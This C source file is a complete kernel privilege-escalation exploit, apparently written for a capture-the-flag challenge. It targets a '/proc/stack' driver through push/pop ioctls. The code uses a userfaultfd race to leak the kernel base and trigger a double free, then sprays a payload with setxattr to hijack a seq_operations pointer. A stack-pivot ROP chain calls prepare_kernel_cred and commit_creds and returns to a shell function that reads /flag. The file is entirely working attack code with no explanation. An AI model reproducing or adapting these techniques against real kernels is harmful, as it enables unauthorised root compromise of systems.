#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <poll.h>
#include <assert.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include<sys/xattr.h>


#define ulong unsigned long

#define CMD_PUSH 0x57ac0001
#define CMD_POP  0x57ac0002

int fd;
pthread_t thread;
ulong base=0;
uint64_t race_page;
static void (*race_function)();
ulong user_cs,user_ss,user_sp,user_rflags;

void push(ulong * buf){
    int ret = ioctl(fd,CMD_PUSH,buf);
    if(ret<0){
        perror("PUSH ioctl");
        exit(0);
    }
    return;
}

void pop(ulong * buf){
    int ret = ioctl(fd,CMD_POP,buf);
    if(ret < 0){
        perror("POP ioctl");
        exit(0);
    }
    printf("Found 0x%lx\n",*buf);
    return;
}
static void save_state(void) {
  asm (
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

void leaking(){
    unsigned long buf=0;
    pop(&buf);
    base = buf;
    return;
}

void doubleFree(){
    ulong buf = 0;
    pop(&buf);
    return;
}

void do_shm(){
    int shmid = shmget(0x66, 0x1000, SHM_R | SHM_W | IPC_CREAT);
    char *shm_addr;
    if (shmid < 0) {
        perror("shmget");
        exit(0);
    }
    shm_addr = shmat(shmid, 0, 0);
    if ((ulong)shm_addr == -1) {
        perror("shmat");
        exit(0);
    }
    shmdt(shm_addr);
    return;
}

void *racer(void *arg)
{
    struct uffd_msg uf_msg;
    struct uffdio_copy uf_copy;
    struct uffdio_range uf_range;
    long uffd = (long)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    uf_range.start = race_page;
    uf_range.len = 0x1000;

    while(poll(&pollfd, 1, -1) > 0)
    {
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
        {
            perror("polling error");
            exit(-1);
        }
        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
        {
            perror("error reading event");
            exit(-1);
        }
        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("unexpected result from event");
            exit(-1);
        }
        
        race_function();

        char uf_buffer[0x1000];
        uf_copy.src = (unsigned long)uf_buffer;
        uf_copy.dst = race_page;
        uf_copy.len = 0x1000;
        uf_copy.mode = 0;
        uf_copy.copy = 0;
        if(ioctl(uffd, UFFDIO_COPY, (unsigned long)&uf_copy) == -1)
        {
            perror("uffdio_copy error");
            exit(-1);
        }
        if (ioctl(uffd, UFFDIO_UNREGISTER, (unsigned long)&uf_range) == -1)
        {
            perror("error unregistering page for userfaultfd");
        }
        if (munmap((void *)race_page, 0x1000) == -1)
        {
            perror("error on munmapping race page");
        }
        return 0;
    }
    return 0;
}

void register_userfault()
{
    int uffd, race;
    struct uffdio_api uf_api;
    struct uffdio_register uf_register;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    uf_api.api = UFFD_API;
    uf_api.features = 0;

    if (ioctl(uffd, UFFDIO_API, (unsigned long)&uf_api) == -1)
    {
        perror("error with the uffdio_api");
        exit(-1);
    }

    if (mmap((void *)race_page, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != (void *)race_page)
    {
        perror("whoopsie doopsie on mmap");
        exit(-1);
    }

    uf_register.range.start = race_page;
    uf_register.range.len = 0x1000;
    uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

    if (ioctl(uffd, UFFDIO_REGISTER, (unsigned long)&uf_register) == -1)
    {
        perror("error registering page for userfaultfd");
    }

    race = pthread_create(&thread, NULL, racer, (void*)(long)uffd);
    if(race != 0)
    {
        perror("can't setup threads for race");
    }
    return;
}
void shell(){
    system("/bin/cat /flag");
}


int main(){
    int sfd;
    save_state();
    fd = open("/proc/stack",O_RDWR);
    race_page = 0xbaaad000;
    register_userfault();
    do_shm();
    race_function = &leaking;
    push((ulong *)race_page);
    base-=0xc37bc0;
    printf("kernel base %p\n",(void *)base);

    ulong mov_rsp = base + 0x5832b;    // mov esp,0x83c389c0 ; ret
    ulong pop_rdi = base + 0x34505;    // pop rdi ; ret
    //ulong pop_rdx = base + 0x10dc0f;   // pop rdx ; ret
    ulong pop_rdx = base + 0x1ead83; 
    ulong prepare_cred = base + 0x69e00;   // prepare_kernel_cred
    ulong commit_cred = base + 0x69c10;    // commit_creds
    ulong pop_r8 = base + 0x22beb4;        // pop r8 ; ret
    ulong mov_rdi_rax = base + 0xa296e;    // mov rdi, rax ; cmp r8, rdx ; jne addr ; ret
    ulong trampoline = base + 0x600a4a;    // setting regs and returning

    ulong  *stack  = mmap(0x83C38000, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if((ulong)stack!=0x83c38000){
        perror("mmap");
    }


    ulong * rop =(ulong *) 0x83C389c0;
    *rop ++ = pop_rdi;
    *rop ++ = 0;
    *rop ++ = prepare_cred;
    *rop ++ = pop_r8;
    *rop ++ = 0;
    *rop ++ = pop_rdx;
    *rop ++ = 0;
    *rop ++ = mov_rdi_rax;
    *rop ++ = commit_cred;
    *rop ++ = trampoline;
    *rop ++ = 0; 
    *rop ++ = 0; 
    *rop ++ = (ulong)&shell;
    *rop ++ = user_cs;
    *rop ++ = user_rflags;
    *rop ++ = user_sp;
    *rop ++ = user_ss;
   
    sleep(1);
    race_page = 0xf00d0000;
    race_function = &doubleFree;
    register_userfault();
    ulong buf = 0x12345;
    push(&buf);
    pop((ulong *)race_page);
    if((sfd = open("/proc/self/stat", O_RDONLY)) == -1)
        perror("single_open");
    char buffer[0x20];
    for(int ix = 0; ix !=4 ; ++ix )
        *(unsigned long*)(buffer+ix*8) = mov_rsp;
    setxattr("/tmp", "SHE_IS_SUMMER", buffer, 0x20, XATTR_CREATE);
    read(sfd,buffer,0x10);
    return 0;
}
